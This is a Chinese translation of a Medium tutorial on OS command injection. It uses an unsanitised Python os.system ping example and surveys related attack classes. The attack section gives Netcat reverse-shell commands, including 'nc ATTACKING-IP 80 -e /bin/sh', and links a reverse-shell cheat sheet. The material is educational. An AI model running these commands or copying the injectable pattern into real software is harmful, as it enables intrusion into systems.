# 命令执行:OWASP 最大漏洞

> 原文：<https://medium.com/nerd-for-tech/command-execution-owasp-top-vulnerability-ad9a85163ab4?source=collection_archive---------21----------------------->

![](img/1697d969d1dcc491368a8146d4ca6a5d.png)

[src](https://www.uhdpaper.com/2019/12/green-arrow-dc-4k-42289.html)

# 什么是命令执行？

命令注入也称为操作系统命令注入是一种通过获取外壳来利用运行外部操作系统命令的系统应用程序的方法，这可能是由用户输入的不良净化或验证造成的。这可能导致在目标系统上执行任意命令。这也可能导致攻击者破坏整个数据库，其中可能包括用户的个人信息。

攻击者可以从受损系统中请求、删除、添加、编辑信息(如 XML 配置文件),甚至可以在系统中注入一个后门，以便以后访问。

当开发人员在其源代码中使用 system()或等效命令时，发现此漏洞的机会会增加。

```
import osdomain = user_input() #enter the website to trace
os.system('ping'+ domain) #counts the hops to domain
```

上面的代码将 ping 用户输入的域。但是您可能会注意到，用户输入在传递给在系统上执行命令的 system()之前没有被过滤。

那么，如果用户决定输入开发人员不希望输入的内容，例如

```
import osdomain = user_input() #ls -a;
os.system('ping'+ domain) #counts the hops to domain
```

在这种情况下，域变量将存储命令“ls-a；”，前面的命令以“；”结束允许您输入另一个命令。

```
ls -a ; ping
```

因此，这里系统将执行没有属性的“ls -a”命令和“ping”命令。还可以包含其他命令来代替 ls -a。

但是你可能会想，

# **为什么应用程序需要执行系统命令？**

很明显，因为应用程序需要与系统通信以实现其内部功能，或者它可能想要运行其他应用程序，或者可能想要运行用其他编程语言编写的程序。

因此，它总结了进行 system()调用是多么有用，这是一个非常有用的特性，除非它被合法地使用。

# **命令注射**

好吧，这对用户来说不是问题，但这会给攻击者带来很多机会，可能发生的最糟糕的事情是攻击者可以产生一个反向外壳并在 web 服务器(目标系统)上执行命令注入攻击。为了完成这个场景，我们有一大堆反向外壳可以使用，你可以从[这里](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)得到它们。

# **方法**

以下是由相同漏洞导致的不同类型的命令注入攻击。

# 任意命令注入

对用户输入的不良净化或验证会导致此漏洞。在这里，攻击者可以向系统注入恶意命令。

# 任意文件上传

允许上传文件而不验证文件中的扩展名或数据的网站可能导致利用此漏洞进行攻击，这种类型的攻击可能属于上传恶意代码块的代码注入类别。

# 不安全序列化

每个通信都需要数据的序列化和反序列化，但是如果数据的反序列化(服务器端)在没有任何适当验证的情况下发生，则可能导致命令执行。

# 服务器端模板注入(SSTI)

该漏洞允许攻击者插入恶意的服务器端模板，许多服务器端应用程序使用该模板来生成有效的 HTML 响应。

# XML 外部实体注入(XXE)

XXE 是一个攻击漏洞，它滥用 XML 解析器/数据的功能。它会导致敏感数据泄露、服务器端请求伪造(SSRF)或拒绝服务攻击。

# 攻击

在本文中，我们将重点讨论 Netcat 反向 shell。

反向外壳是从目标机器向处于监听状态的攻击者主机发起的外壳，以拾取外壳。bind shell 在目标主机上设置(在本例中是通过注入)了一个特定的端口，该端口将启动与攻击者设备的连接，从而建立连接。反向壳也可以被称为后门(正如它的发音一样)。

## 步骤:

1.  在攻击者的设备上设置监听器。
2.  从目标设备启动连接。
3.  发布命令，享受你的反向外壳。

您应该首先设置监听器，如下所示。

```
nc -lvp 80
```

下一步，我们执行以下命令，借助以下命令在目标主机上启动连接。

```
nc ATTACKING-IP 80 -e /bin/sh
```

如果这不起作用

```
/bin/sh | nc ATTACKING-IP 80
```

这里有一整套逆向 shell[和](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)，所以不要把自己局限在 Netcat 上，也要尝试新的 shell。